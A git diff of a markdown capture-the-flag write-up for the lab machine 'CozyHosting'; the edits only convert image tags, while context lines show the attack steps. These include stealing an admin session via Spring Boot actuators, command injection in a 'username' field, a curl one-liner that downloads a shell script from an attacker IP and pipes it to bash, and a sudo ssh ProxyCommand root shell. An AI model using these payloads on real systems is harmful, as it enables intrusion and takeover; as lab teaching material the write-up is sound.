@@ -36,7 +36,7 @@ We can add this host to our `/etc/hosts` file and start proxying traffic through
 
 Port 80 shows a basic corporate site:
 
-<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(25).png>)
 
 There is a login function, but weak credentials or basic SQL Injection attacks don't seem to work. I did a `gobuster` directory scan, which revealed a few directories:
 
@@ -65,13 +65,13 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 When visiting all of these, the `/error` endpoint stood out:
 
-<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(26).png>)
 
 Whitelabel Error Page means that the website uses Spring Boot, which requires a different method of enumeration. Using something called Actuators, we can query information about the website through HTTP requests:
 
 {% embed url="https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators" %}
 
-<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(27).png>)
 
 Using this, we can try to find some custom endpoints that may not be present in any wordlist. We can use the `/actuator/mappings` directory for this:
 
@@ -117,13 +117,13 @@ $ curl --silent http://cozyhosting.htb/actuator/sessions | jq
 
 Using this cookie, we can access the administrator dashboard:
 
-<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(28).png>)
 
 ### Admin Dashboard -> RCE
 
 At the bottom of the dashboard, we can see a few fields that take user input and hint that this is the `/executessh` service:
 
-<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(29).png>)
 
 When submitting some random values, the browser sends a POST request to `/executessh`, and the error is sent through a GET request:
 
@@ -166,11 +166,11 @@ Upgrade-Insecure-Requests: 1
 host=127.0.0.1&username=`id`
 ```
 
-<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(30).png>)
 
 Using this, we can try to get a reverse shell as the user. When testing random payloads, I managed to trigger an error on the machine as well by typing `{$IFS}` wrongly:
 
-<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(31).png>)
 
 The `bash` reverse shell one-liner didn't work and was quite problematic with all of its special characters, so I used a `curl` one-liner instead.
 
@@ -178,7 +178,7 @@ The `bash` reverse shell one-liner didn't work and was quite problematic with al
 curl${IFS}10.10.14.22/shell.sh|bash
 ```
 
-<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(32).png>)
 
 ## Privilege Escalation
 
@@ -261,7 +261,7 @@ grep: (standard input): binary file matches
 
 The above password works and we can login to the database:
 
-<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(33).png>)
 
 Afterwards, we can enumerate this database. There are a few databases available:
 
@@ -323,7 +323,7 @@ josh
 
 Using this password, we can `ssh` in as `josh`:
 
-<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(34).png>)
 
 ### Sudo Privileges -> Root
 
@@ -347,6 +347,6 @@ Using the command on GTFOBins, we can spawn a `root` shell:
 sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
 ```
 
-<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(35).png>)
 
 Rooted!
